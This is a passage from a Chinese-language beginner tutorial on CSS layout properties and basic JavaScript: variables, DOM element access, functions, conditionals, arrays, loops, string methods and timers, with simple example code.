4px);box-sizing1、content-box 默认的盒子尺寸计算方式2、border-box 置盒子的尺寸计算方式为从边框开始，盒子的尺寸，边框和内填充算在盒子尺寸内7.2.3 响应式布局响应式布局就是使用媒体查询的方式，通过查询浏览器宽度，不同的宽度应用不同的样式块，每个样式块对应的是该宽度下的布局方式，从而实现响应式布局。响应式布局的页面可以适配多种终端屏幕（pc、平板、手机）。相应布局的伪代码如下：12345678@media (max-width:960px)&#123; .left_con&#123;width:58%;&#125; .right_con&#123;width:38%;&#125;&#125;@media (max-width:768px)&#123; .left_con&#123;width:100%;&#125; .right_con&#123;width:100%;&#125;&#125;7.2.4 基于rem的布局首先了解em单位，em单位是参照元素自身的文字大小来设置尺寸，rem指的是参照根节点的文字大小，根节点指的是html标签，设置html标签的文字大小，其他的元素相关尺寸设置用rem，这样，所有元素都有了统一的参照标准，改变html文字的大小，就会改变所有元素用rem设置的尺寸大小。cssrem安装cssrem插件可以动态地将px尺寸换算成rem尺寸下载本项目，比如：git clone https://github.com/flashlizi/cssrem 进入packages目录：Sublime Text -&gt; Preferences -&gt; Browse Packages… 复制下载的cssrem目录到刚才的packges目录里。 重启Sublime Text。配置参数 参数配置文件：Sublime Text -&gt; Preferences -&gt; Package Settings -&gt; cssrem px_to_rem - px转rem的单位比例，默认为40。 max_rem_fraction_length - px转rem的小数部分的最大长度。默认为6。 available_file_types - 启用此插件的文件类型。默认为：[“.css”, “.less”, “.sass”]。8. 常用css列表color 设置文字的颜色，如： color:red;font-size 设置文字的大小，如：font-size:12px;font-family 设置文字的字体，如：font-family:’微软雅黑’;font-style 设置字体是否倾斜，如：font-style:’normal’; 设置不倾斜，font-style:’italic’;设置文字倾斜font-weight 设置文字是否加粗，如：font-weight:bold; 设置加粗 font-weight:normal 设置不加粗line-height 设置文字的行高，设置行高相当于在每行文字的上下同时加间距， 如：line-height:24px;font 同时设置文字的几个属性，写的顺序有兼容问题，建议按照如下顺序写： font：是否加粗 字号/行高 字体；如： font:normal 12px/36px ‘微软雅黑’;text-decoration 设置文字的下划线，如：text-decoration:none; 将文字下划线去掉text-indent 设置文字首行缩进，如：text-indent:24px; 设置文字首行缩进24pxtext-align 设置文字水平对齐方式，如text-align:center 设置文字水平居中text-overflow 设置一行文字宽度超过容器宽度时的显示方式，如：text-overflow:clip 将多出的文字裁剪掉 text-overflow:ellipsis 将多出的文字显示成省略号white-space 一般用来设置文本不换行，如：white-space:nowrap 设置文本不换行 一般与text-overflow和overflow属性配合使用来让一行文字超出宽度时显示省略号list-style 一般用来设置去掉ul或者ol列表中的小圆点或数字 如：list-style:nonewidth 设置盒子内容的宽度，如： width：100px;height 设置盒子内容的高度，如： height：100px;border-top 设置盒子顶部边框的三个属性 如：border-top:5px solid red;设置盒子顶部边框为3像素宽的红色的实线，详细设置说明：盒子模型border-left 设置盒子左边边框的三个属性 如：border-left:3px dotted red;设置盒子左边边框为3像素宽的红色的点线，详细设置说明：盒子模型border-right 设置盒子右边边框的三个属性 如：border-right:2px dashed red;设置盒子右边框为2像素宽的红色的虚线，详细设置说明：盒子模型border-bottom 设置盒子底部边框的三个属性 如：border-bottom:1px solid red;设置盒子底部边框为1像素宽的红色的实线，详细设置说明：盒子模型border 同时设置盒子的四个边框，如果四个边的样式统一就使用它 如：border:1px solid #000 设置盒子四个边都是1像素宽的黑色实线，详细设置说明：盒子模型padding 设置盒子四个边的内边距 如：padding:10px 20px 30px 40px 分别设置盒子上边(10px)、右边(20px)、下边(30px)、左边(40px)的内边距(顺时针)，详细设置说明：盒子模型margin 设置盒子四个边的外边距 如：margin:10px 20px 30px 40px 分别设置盒子上边(10px)、右边(20px)、下边(30px)、左边(40px)的外边距(顺时针)，详细设置说明：盒子模型overflow 设置当子元素的尺寸超过父元素的尺寸时，盒子及子元素的显示方式 如：overflow:hidden 超出的子元素被裁切，详细设置说明：元素溢出display 设置盒子的显示类型及隐藏，如：display:block 将盒子设置为以块元素显示 display:none 将元素隐藏，详细设置说明：元素类型float 设置元浮动 如：float:left 设置左浮动 float:right 设置右浮动，详细设置说明：元素浮动clear 在盒子两侧清除浮动 如：clear:both 在盒子两侧都不允许浮动，详细设置说明：元素浮动position 设置元素定位 如：position:relative 设置元素相对定位，详细设置说明：元素定位background 设置元素的背景色和背景图片，如：background:url(bg.jpg) cyan;设置盒子的背景图片为bg.jpg，背景色为cyan，详细设置说明：元素背景background-size 设置盒子背景图的尺寸，如：background-size:30px 40px;设置背景图的尺寸宽为30px，高为40px，这个属性不能合到background属性中，详细设置说明：retina屏适配opacity 设置元素整体透明度，一般为了兼容需要加上filter属性设置 如：opacity:0.1;filter:alpha(opacity=10)cursor 设置鼠标悬停在元素上时指针的形状 如：cursor:pointer 设置为手型outline 设置文本输入框周围凸显的蓝色的线，一般是设为没有 如：outline:noneborder-radius 设置盒子的圆角 如：border-radius:10px 设置盒子的四个角为10px半径的圆角，详细设置说明：css圆角box-shadow 设置盒子的阴影，如：box-shadow:10px 10px 5px 2px pink;设置盒子有粉色的阴影，详细设置说明：css阴影transition 设置盒子的过渡动画，如：transition:all 1s ease;设置元素过渡动画为1秒完成，所有变动的属性都做动画，详细设置说明：过渡动画animation 设置盒子的关键帧动画，详细设置说明：关键帧动画transform 设置盒子的位移、旋转、缩放、斜切等变形，如：transform:rotate(45deg);设置盒子旋转45度，详细设置说明：元素变形box-sizing 设置盒子的尺寸计算方式，如：box-sizing:border-box 将盒子的尺寸计算方法设置为按边框计算，此时width和height的值就是盒子的实际尺寸border-collapse 设置表格边框是否合并，如：border-collapse:collapse，将表格边框合并，这样就可以制作1px边框的表格。9. JavaScript9.1 JavaScript介绍JavaScript是运行在浏览器端的脚步语言，JavaScript主要解决的是前端与用户交互的问题，包括使用交互与数据交互。 JavaScript是浏览器解释执行的，前端脚本语言还有JScript（微软，IE独有），ActionScript( Adobe公司，需要插件)等。前端三大块1、HTML：页面结构2、CSS：页面表现：元素大小、颜色、位置、隐藏或显示、部分动画效果3、JavaScript：页面行为：部分动画效果、页面与用户的交互、页面功能9.2 JavaScript嵌入页面的方式1、行间事件（主要用于事件）1&lt;input type="button" name="" onclick="alert('ok！');"&gt;2、页面script标签嵌入123&lt;script type="text/javascript"&gt; alert('ok！');&lt;/script&gt;3、外部引入1&lt;script type="text/javascript" src="js/index.js"&gt;&lt;/script&gt;9.3 变量JavaScript 是一种弱类型语言，javascript的变量类型由它的值来决定。 定义变量需要用关键字 ‘var’123456var iNum = 123;var sTr = 'asd';//同时定义多个变量可以用","隔开，公用一个‘var’关键字var iNum = 45,sTr='qwe',sCount='68';9.3.1 变量类型5种基本数据类型：1、number 数字类型2、string 字符串类型3、boolean 布尔类型 true 或 false4、undefined undefined类型，变量声明未初始化，它的值就是undefined5、null null类型，表示空对象，如果定义的变量将来准备保存对象，可以将变量初始化为null,在页面上获取不到对象，返回的值就是null1种复合类型：object9.3.2 javascript语句与注释1、一条javascript语句应该以“;”结尾12345678&lt;script type="text/javascript"&gt; var iNum = 123; var sTr = 'abc123'; function fnAlert()&#123; alert(sTr); &#125;; fnAlert();&lt;/script&gt;2、javascript注释1234567891011&lt;script type="text/javascript"&gt; // 单行注释 var iNum = 123; /* 多行注释 1、... 2、... */ var sTr = 'abc123';&lt;/script&gt;9.3.3 变量、函数、属性、函数参数命名规范1、区分大小写2、第一个字符必须是字母、下划线（_）或者美元符号（$）3、其他字符可以是字母、下划线、美元符或数字9.3.4 匈牙利命名风格对象o Object 比如：oDiv数组a Array 比如：aItems字符串s String 比如：sUserName整数i Integer 比如：iItemCount布尔值b Boolean 比如：bIsComplete浮点数f Float 比如：fPrice函数fn Function 比如：fnHandler正则表达式re RegExp 比如：reEmailCheck9.4 获取元素方法一可以使用内置对象document上的getElementById方法来获取页面上设置了id属性的元素，获取到的是一个html对象，然后将它赋值给一个变量，比如：12345&lt;script type="text/javascript"&gt; var oDiv = document.getElementById('div1');&lt;/script&gt;....&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;上面的语句，如果把javascript写在元素的上面，就会出错，因为页面上从上往下加载执行的，javascript去页面上获取元素div1的时候，元素div1还没有加载，解决方法有两种：第一种方法：将javascript放到页面最下边12345678....&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;....&lt;script type="text/javascript"&gt; var oDiv = document.getElementById('div1');&lt;/script&gt;&lt;/body&gt;第二种方法：将javascript语句放到window.onload触发的函数里面,获取元素的语句会在页面加载完后才执行，就不会出错了。123456789&lt;script type="text/javascript"&gt; window.onload = function()&#123; var oDiv = document.getElementById('div1'); &#125;&lt;/script&gt;....&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;9.5 操作元素属性获取的页面元素，就可以对页面元素的属性进行操作，属性的操作包括属性的读和写。9.5.1 操作属性的方法1、“.” 操作2、“[ ]”操作9.5.2 属性写法1、html的属性和js里面属性写法一样2、“class” 属性写成 “className”3、“style” 属性里面的属性，有横杠的改成驼峰式，比如：“font-size”，改成”style.fontSize”通过“.”操作属性：具体来说是操作属性的值1234567891011121314151617181920212223242526272829303132333435363738394041&lt;script type="text/javascript"&gt; // 当整个页面加载完毕之后再执行花括号里面的语句 window.onload = function () &#123; // 通过ID名获取元素赋值给oDiv变量 var oDiv = document.getElementById("div1"); var oA = document.getElementById("link"); var oDiv2 = document.getElementById("div2"); // 改变元素的属性 oDiv.style.color = "red"; oDiv.style.fontSize = "20px"; oA.href = "http://www.baidu.com"; oA.title = "这是一个百度网的链接"; oDiv2.className = "box2"; // 读取元素的属性 var sId = oDiv.id; alert(sId) &#125;&lt;/script&gt;&lt;style type="text/css"&gt; .box&#123; font-size: 20px; color: gold; &#125; .box2&#123; font-size: 30px; color: pink; &#125;&lt;/style&gt;&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;&lt;a href="#" id="link"&gt;这是一个链接&lt;/a&gt;&lt;div class="box" id="div2"&gt;这是第二个div元素&lt;/div&gt;通过“[ ]”操作属性：具体来说是操作属性，把属性作为变量来处理，而不是作为一个值来处理123456789101112131415161718192021&lt;script type="text/javascript"&gt; window.onload = function()&#123; var oInput1 = document.getElementById('input1'); var oInput2 = document.getElementById('input2'); var oA = document.getElementById('link1'); // 读取属性 var sVal1 = oInput1.value; var sVal2 = oInput2.value; // 写(设置)属性 // oA.style.val1 = val2; 没反应 oA.style[sVal1] = sVal2; &#125;&lt;/script&gt;......&lt;input type="text" name="setattr" id="input1" value="fontSize"&gt;&lt;input type="text" name="setnum" id="input2" value="30px"&gt;&lt;a href="http://www.baidu.com" id="link1"&gt;这是百度网站地址&lt;/a&gt;9.5.3 innerHTMLinnerHTML可以读取或者写入标签包裹的内容1234567891011121314&lt;script type="text/javascript"&gt; window.onload = function()&#123; var oDiv = document.getElementById('div1'); //读取 var sTxt = oDiv.innerHTML; alert(sTxt); //写入 oDiv.innerHTML = '&lt;a href="http://http://www.baidu.com"&gt;这是百度网站地址&lt;a/&gt;'; &#125;&lt;/script&gt;......&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;9.6 函数函数就是重复执行的代码片。9.6.1 函数定义与执行123456789101112131415161718192021&lt;script type="text/javascript"&gt; // 函数的定义 function fnMyalert() &#123; alert('Hello world!') &#125; function fnChange() &#123; var oDiv = document.getElementById("div1"); oDiv.style.color = "red"; oDiv.style.fontSize = "30px"; &#125; //函数执行 // fnChange();&lt;/script&gt;&lt;!--标签里调用函数执行--&gt;&lt;div id="div1" onclick="fnMyalert()"&gt;这是一个div元素&lt;/div&gt;&lt;input type="button" name="" value="改变div" onclick="fnChange()"&gt;9.6.2 变量与函数预解析JavaScript解析过程分为两个阶段，先是编译阶段，然后执行阶段，在编译阶段会将function定义的函数提前，并且将var定义的变量声明提前，将它赋值为undefined。12345678&lt;script type="text/javascript"&gt; fnAlert(); // 弹出 hello！ alert(iNum); // 弹出 undefined function fnAlert()&#123; alert('hello!'); &#125; var iNum = 123;&lt;/script&gt;9.6.3 提取行间事件在html行间调用的事件可以提取到javascript中调用，从而做到结构与行为分离。说白了就是在html的标签中不含有任何关于js的代码，如下例，通过html标签中的id跟js关联起来，从而使用js。12345678910111213141516171819202122&lt;!--行间事件调用函数 --&gt;&lt;script type="text/javascript"&gt; function fnAlert()&#123; alert('ok!'); &#125;&lt;/script&gt;......&lt;input type="button" name="" value="弹出" onclick="fnAlert()"&gt;&lt;!-- 提取行间事件 --&gt;&lt;script type="text/javascript"&gt;window.onload = function()&#123; var oBtn = document.getElementById('btn1'); oBtn.onclick = fnAlert; function fnAlert()&#123; alert('ok!'); &#125;&#125; &lt;/script&gt;......&lt;input type="button" name="" value="弹出" id="btn1"&gt;9.6.4 匿名函数定义的函数可以不给名称，这个叫做匿名函数，可以将匿名函数直接赋值给元素绑定的事件来完成匿名函数的调用。123456789101112131415161718&lt;script type="text/javascript"&gt;window.onload = function()&#123; var oBtn = document.getElementById('btn1'); /* oBtn.onclick = myalert; function myalert()&#123; alert('ok!'); &#125; */ // 直接将匿名函数赋值给绑定的事件 oBtn.onclick = function ()&#123; alert('ok!'); &#125;&#125;&lt;/script&gt;9.6.5 综合练习网页换肤1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;link rel="stylesheet" href="css/004_01.css" id="link01"&gt; &lt;script type="text/javascript"&gt; window.onload = function () &#123; var oBtn01 = document.getElementById("btn01"); var oBtn02 = document.getElementById("btn01"); var oLink = document.getElementById("link01"); oBtn01.onclick = function () &#123; oLink.href = "css/004_01.css"; &#125;; oBtn02.onclick = function () &#123; oLink.href = "css/004_02.css"; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="button" name="" value="皮肤1" id="btn01"&gt;&lt;input type="button" name="" value="皮肤2" id="btn02"&gt;&lt;/body&gt;&lt;/html&gt;1234567891011/* css/004_01.css */body&#123; background-color: gold;&#125;input&#123; width: 200px; height: 50px; background-color: aqua; border: 0;&#125;12345678910/* css/004_02.css */body&#123; background-color: pink;&#125;input&#123; width: 200px; height: 50px; background-color: aqua; border: 0;&#125;9.6.6 函数传参123456&lt;script type="text/javascript"&gt; function fnAlert(a)&#123; alert(a); &#125; fnAlert(12345);&lt;/script&gt;9.6.7 函数’return’关键字函数中’return’关键字的作用：1、返回函数执行的结果2、结束函数的运行3、阻止默认行为1234567891011121314151617181920212223242526272829303132// 函数返回值+结束函数运行&lt;script type="text/javascript"&gt; function fnAdd(a,b) &#123; var c = a + b; alert('hello-1'); // hello-1 // 返回c的值，结束函数的运行 return c; // 这一句不弹出 alert('hello-2'); &#125; var result = fnAdd(3,4); alert(result); // 弹出7&lt;/script&gt;// 函数传参&lt;script type="text/javascript"&gt; window.onload = function () &#123; function fnChangestyle(mystyle,val) &#123; var oDiv = document.getElementById("div1"); oDiv.style[mystyle] = val; &#125; fnChangestyle("color","pink"); fnChangestyle("fontSize","30px"); &#125;&lt;/script&gt;&lt;div id="div1"&gt;这是一个div元素&lt;/div&gt;9.7 条件语句通过条件来控制程序的走向，就需要用到条件语句。9.7.1 运算符1、算术运算符： +(加)、 -(减)、 (乘)、 /(除)、 %(求余数)2、赋值运算符：=、 +=、 -=、 =、 /=、 %=3、条件运算符：==、===、&gt;、&gt;=、&lt;、&lt;=、!=、&amp;&amp;(而且)、||(或者)、!(否)123456789101112131415161718192021&lt;script type="text/javascript"&gt; window.onload = function () &#123; var oInput01 = document.getElementById("input01"); var oInput02 = document.getElementById("input02"); var oBtn = document.getElementById("btn"); oBtn.onclick = function () &#123; // parseInt()函数转换成数字 var iVal01 = parseInt(oInput01.value); var iVal02 = parseInt(oInput02.value); var iBtn = iVal01 + iVal02; alert(iBtn); &#125; &#125;;&lt;/script&gt;&lt;input type="text" name="" id="input01"&gt; +&lt;input type="text" name="" id="input02"&gt;&lt;input type="button" name="" value="相加" id="btn"&gt;9.7.2 if else1234567891011&lt;script type="text/javascript"&gt; var iNum01 = 3; var iNum02 = 5; var sTr; if (iNum01 &gt; iNum02) &#123; sTr = '大于'; &#125; else &#123; sTr = '小于'; &#125; alert(sTr);&lt;/script&gt;9.7.3 理解练习制作单个按钮点击切换元素的显示和隐藏效果12345678910111213141516171819202122232425&lt;script type="text/javascript"&gt; window.onload = function () &#123; var oBtn = document.getElementById("btn01"); var oDiv = document.getElementById("box01"); oBtn.onclick = function () &#123; if (oDiv.style.display == "none") &#123; oDiv.style.display = 'block'; &#125; else &#123; oDiv.style.display = "none"; &#125; &#125; &#125;&lt;/script&gt;&lt;style type="text/css"&gt; .box &#123; width: 200px; height: 400px; background-color: gold; &#125;&lt;/style&gt;&lt;input type="button" value="切换" id="btn01"&gt;&lt;div class="box" id="box01"&gt;&lt;/div&gt;9.7.4 多重if else语句12345678910111213var iNow = 1;if(iNow==1)&#123; ... ;&#125;else if(iNow==2)&#123; ... ;&#125;else&#123; ... ;&#125;9.7.5 switch语句多重if else语句可以换成性能更高的switch语句123456789101112var iNow = 1;switch (iNow)&#123; case 1: ...; break; case 2: ...; break; default: ...;&#125;9.7.6 理解练习制作随着星期换背景的页面123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script type="text/javascript"&gt; window.onload = function () &#123; var iWeek = 5; var oBody = document.getElementById("body01"); switch (iWeek) &#123; case 1: oBody.style.backgroundColor = "gold"; break; case 2: oBody.style.backgroundColor = "pink"; break; case 3: oBody.style.backgroundColor = "red"; break; case 4: oBody.style.backgroundColor = "green"; break; case 5: oBody.style.backgroundColor = "yellow"; break; default : oBody.style.backgroundColor = "blue"; break; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body id="body01"&gt;&lt;/body&gt;&lt;/html&gt;9.8 数组及操作方法数组就是一组数据的集合，javascript中，数组里面的数据可以是不同类型的。9.8.1 定义数组的方法12345//对象的实例创建var aList = new Array(1,2,3);//直接量创建var aList2 = [1,2,3,'asd'];9.8.2 操作数组中数据的方法1、获取数组的长度：aList.length;12var aList = [1,2,3,4];alert(aList.length); // 弹出42、用下标操作数组的某个数据：aList[0];12var aList = [1,2,3,4];alert(aList[0]); // 弹出13、join() 将数组成员通过一个分隔符合并成字符串12var aList = [1,2,3,4];alert(aList.join('-')); // 弹出 1-2-3-44、push() 和 pop() 从数组最后增加成员或删除成员12345var aList = [1,2,3,4];aList.push(5);alert(aList); //弹出1,2,3,4,5aList.pop();alert(aList); // 弹出1,2,3,45、unshift()和 shift() 从数组前面增加成员或删除成员12345var aList = [1,2,3,4];aList.unshift(5);alert(aList); //弹出5,1,2,3,4aList.shift();alert(aList); // 弹出1,2,3,46、reverse() 将数组反转123var aList = [1,2,3,4];aList.reverse();alert(aList); // 弹出4,3,2,17、indexOf() 返回数组中元素第一次出现的索引值12var aList = [1,2,3,4,1,3,4];alert(aList.indexOf(1));8、splice() 在数组中增加或删除成员123var aList = [1,2,3,4];aList.splice(2,1,7,8,9); //从第2个元素开始，删除1个元素，然后在此位置增加'7,8,9'三个元素alert(aList); //弹出 1,2,7,8,9,49.8.3 多维数组多维数组指的是数组的成员也是数组的数组。123var aList = [[1,2,3],['a','b','c']];alert(aList[0][1]); //弹出2;批量操作数组中的数据，需要用到循环语句9.9 循环语句程序中进行有规律的重复性操作，需要用到循环语句。9.9.1 for循环1234for(var i=0;i&lt;len;i++)&#123; ......&#125;9.9.2 课堂练习1、将数组中的数据分别用弹框弹出12345678910111213&lt;script type="text/javascript"&gt; for (var i = 0; i &lt; 5; i++) &#123; alert(i); &#125; var aList = ['a','b','c','d','e']; var iLen = aList.length; for (var i = 0; i &lt; iLen; i++) &#123; alert(aList[i]); &#125;&lt;/script&gt;2、将数组中的数据放入到页面中的列表中1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;script type="text/javascript"&gt; window.onload = function () &#123; var oLl = document.getElementsByTagName("li"); var aList = ['apple', 'banana', 'orange', 'xigua', 'boluo']; var aLen = aList.length; for (var i = 0; i &lt; aLen; i++) &#123; var name = aList[i]; // 获取标签内的值 oLl[i].innerHTML = name; &#125; &#125;&lt;/script&gt;&lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;// 另一种方法&lt;script type="text/javascript"&gt; window.onload = function () &#123; var oUl = document.getElementById('list'); var aList = ['apple', 'banana', 'orange', 'xigua', 'boluo']; var aLen = aList.length; var sTr = ''; for (var i = 0; i &lt; aLen; i++) &#123; sTr += '&lt;li&gt;' + aList[i] + '&lt;/li&gt;'; oUl.innerHTML = sTr; &#125; &#125;&lt;/script&gt;&lt;style type="text/css"&gt; .list &#123; list-style: none; margin: 50px auto 0; padding: 0; width: 300px; height: 305px; &#125; .list li &#123; height: 60px; border-bottom: 1px dotted #000; line-height: 60px; font-size: 16px; &#125;&lt;/style&gt;&lt;ul class="list" id="list"&gt;&lt;/ul&gt;9.9.3 while循环123456var i=0;while(i&lt;8)&#123; ...... i++;&#125;9.9.4 数组去重12345678910111213var aList = [1,2,3,4,4,3,2,1,2,3,4,5,6,5,5,3,3,4,2,1];var aList2 = [];for(var i=0;i&lt;aList.length;i++)&#123; if(aList.indexOf(aList[i])==i) &#123; aList2.push(aList[i]); &#125;&#125;alert(aList2);9.10 获取元素方法二可以使用内置对象document上的getElementsByTagName方法来获取页面上的某一种标签，获取的是一个选择集，不是数组，但是可以用下标的方式操作选择集里面的标签元素。1234567891011121314151617&lt;script type="text/javascript"&gt; window.onload = function()&#123; var aLi = document.getElementsByTagName('li'); // aLi.style.backgroundColor = 'gold'; // 出错！不能同时设置多个li alert(aLi.length); aLi[0].style.backgroundColor = 'gold'; &#125;&lt;/script&gt;....&lt;ul&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt;&lt;/ul&gt;课堂练习使用循环操作列表中的每个元素1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;script type="text/javascript"&gt; window.onload = function () &#123; // 通过标签名称获取li元素，生成一个选择集，赋值给aLi var aLi = document.getElementsByTagName('li'); // 读取选择集内元素的个数 //alert(aLi.length); // 弹出13 var iLen = aLi.length; //给一个li设置背景色 //aLi[0].style.backgroundColor = 'gold'; // 不能给选择集设置样式属性 //aLi.style.backgroundColor = 'gold'; /* 同时给所有的li加背景色 for(var i=0;i&lt;iLen;i++) &#123; aLi[i].style.backgroundColor = 'gold'; &#125; */ var oUl = document.getElementById('list1'); var aLi2 = oUl.getElementsByTagName('li'); var iLen2 = aLi2.length; for (var i = 0; i &lt; iLen2; i++) &#123; if (i % 2 == 0) &#123; aLi2[i].style.backgroundColor = 'gold'; &#125; &#125; &#125;&lt;/script&gt;&lt;ul id="list1"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt; &lt;li&gt;8&lt;/li&gt;&lt;/ul&gt;&lt;ul id="list2"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;9.11 Javascript组成1、ECMAscript javascript的语法（变量、函数、循环语句等语法）2、DOM 文档对象模型 操作html和css的方法3、BOM 浏览器对象模型 操作浏览器的一些方法9.12 字符串处理方法1、字符串合并操作：“ + ”1234567var iNum01 = 12;var iNum02 = 24;var sNum03 = '12';var sTr = 'abc';alert(iNum01+iNum02); //弹出36alert(iNum01+sNum03); //弹出1212 数字和字符串相加等同于字符串相加alert(sNum03+sTr); // 弹出12abc2、parseInt() 将数字字符串转化为整数123456var sNum01 = '12';var sNum02 = '24';var sNum03 = '12.32';alert(sNum01+sNum02); //弹出1224alert(parseInt(sNum01)+parseInt(sNum02)) //弹出36alert(sNum03) //弹出数字12 将字符串小数转化为数字整数3、parseFloat() 将数字字符串转化为小数12var sNum03 = '12.32'alert(parseFloat(sNum03)); //弹出 12.32 将字符串小数转化为数字小数4、split() 把一个字符串分隔成字符串组成的数组123456var sTr = '2017-4-22';var aRr = sTr.split("-");var aRr2= sTr.split("");alert(aRr); //弹出['2017','4','2']alert(aRr2); //弹出['2','0','1','7','-','4','-','2','2']5、charAt() 获取字符串中的某一个字符123var sId = "#div1";var sTr = sId.charAt(0);alert(sTr); //弹出 #6、indexOf() 查找字符串是否含有某字符123var sTr = "abcdefgh";var iNum = sTr.indexOf("c");alert(iNum); //弹出27、substring() 截取字符串 用法： substring(start,end)（不包括end）123456var sTr = "abcdefghijkl";var sTr2 = sTr.substring(3,5);var sTr3 = sTr.substring(1);alert(sTr2); //弹出 dealert(sTr3); //弹出 bcdefghijkl8、toUpperCase() 字符串转大写123var sTr = "abcdef";var sTr2 = sTr.toUpperCase();alert(sTr2); //弹出ABCDEF9、toLowerCase() 字符串转小写123var sTr = "ABCDEF";var sTr2 = sTr.toLowerCase();alert(sTr2); //弹出abcdef字符串反转1234var str = 'asdfj12jlsdkf098';var str2 = str.split('').reverse().join('');alert(str2);9.13 类型转换1、直接转换 parseInt() 与 parseFloat()12345678alert('12'+7); //弹出127alert( parseInt('12') + 7 ); //弹出19 alert( parseInt(5.6)); // 弹出5alert('5.6'+2.3); // 弹出5.62.3alert(parseFloat('5.6')+2.3); // 弹出7.8999999999999995alert(0.1+0.2); //弹出 0.3000000000000004alert((0.1*100+0.2*100)/100); //弹出0.3alert((parseFloat('5.6')*100+2.3*100)/100); //弹出7.92、隐式转换 “==” 和 “-”1234567if('3'==3)&#123; alert('相等');&#125;// 弹出'相等'alert('10'-3); // 弹出73、NaN 和 isNaN12alert( parseInt('123abc') ); // 弹出123alert( parseInt('abc123') ); // 弹出NaN9.14 调试程序的方法1、alert弹出的时候程序会卡住，也就是会阻止程序的运行2、console.log3、document.title12345678// 改变的是标签&lt;title&gt;的值window.onload = function () &#123; var iNum01 = 20; setInterval(function () &#123; iNum01++; document.title = iNum01; &#125;,100);&#125;9.15 定时器9.15.1 定时器在javascript中的作用1、制作动画2、异步操作3、函数缓冲与节流定时器类型及语法123456789101112131415161718/* 定时器： setTimeout 只执行一次的定时器 clearTimeout 关闭只执行一次的定时器 setInterval 反复执行的定时器 clearInterval 关闭反复执行的定时器*/var time1 = setTimeout(myalert,2000);var time2 = setInterval(myalert,2000);/*clearTimeout(time1);clearInterval(time2);*/function myalert()&#123; alert('ok!');&#125;9.15.2 课堂练习1、定时器制作移动动画12345678910111213141516171819202122232425262728293031323334353637383940&lt;script type="text/javascript"&gt; window.onload = function () &#123; var oDiv = document.getElementById('div1'); var iLeft = 0; var iSpeed = 3; /* var timer = setInterval(moving,30); function moving()&#123; iLeft += 3; oDiv.style.left = iLeft + 'px'; &#125; */ var timer = setInterval(function () &#123; iLeft += iSpeed; oDiv.style.left = iLeft + 'px'; if (iLeft &gt; 700) &#123; // clearInterval(timer); // 定时器停止执行 iSpeed = -3; // 动画返回 &#125; if (iLeft &lt; 0) &#123; // 动画返回之后再次折返过去 iSpeed = 3; &#125; &#125;, 30); &#125;&lt;/script&gt;&lt;style type="text/css"&gt; .box &#123; width: 200px; height: 200px; background-color: gold; position: absolute; left: 0; top: 100px; &#125;&lt;/style&gt;&lt;div id="div1" class="box"&gt;&lt;/div&gt;2、定时器制作无缝滚动123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;无缝滚动&lt;/title&gt; &lt;style type="text/css"&gt; *&#123; margin:0; padding:0; &#125; .list_con&#123; width:1000px; height:200px; border:1px solid #000; margin:10px auto 0; background-color:#f0f0f0; position:relative; overflow:hidden; &#125; .list_con ul&#123; list-style:none; width:2000px; height:200px; position:absolute; left:0; top:0; &#125; .list_con li&#123; width:180px; height:180px; float:left; margin:10px; &#125; .btns_con&#123; width:1000px; height:30px; margin:50px auto 0; position:relative; &#125; .left,.right&#123; width:30px; height:30px; background-color:gold; position:absolute; left:-40px; top:124px; font-size:30px; line-height:30px; color:#000; font-family: 'Arial'; text-align:center; cursor:pointer; border-radius:15px; opacity:0.5; &#125; .right&#123; left:1010px; top:124px; &#125; &lt;/style&gt; &lt;script type="text/javascript"&gt; window.onload = function()&#123; var oDiv = document.getElementById('slide'); var oBtn01 = document.getElementById('btn01'); var oBtn02 = document.getElementById('btn02'); //通过标签获取元素，获取的是选择集，加上下标才能获取到元素 var oUl = oDiv.getElementsByTagName('ul')[0]; var iLeft = 0; var iSpeed = -2; var iNowspeed = 0; //将ul里面的内容复制一份，整个ul里面就包含了10个li oUl.innerHTML = oUl.innerHTML + oUl.innerHTML; function moving()&#123; iLeft += iSpeed; // 当ul向左滚动到第5个li时，瞬间将整个ul拉回到初始位置 if(iLeft&lt;-1000) &#123; iLeft=0; &#125; //当ul在起始位置往右滚动时候，瞬间将整个ul拉回到往左的第5个li的位置 if(iLeft&gt;0) &#123; iLeft = -1000; &#125; oUl.style.left = iLeft + 'px'; &#125; var timer = setInterval(moving,30); oBtn01.onclick 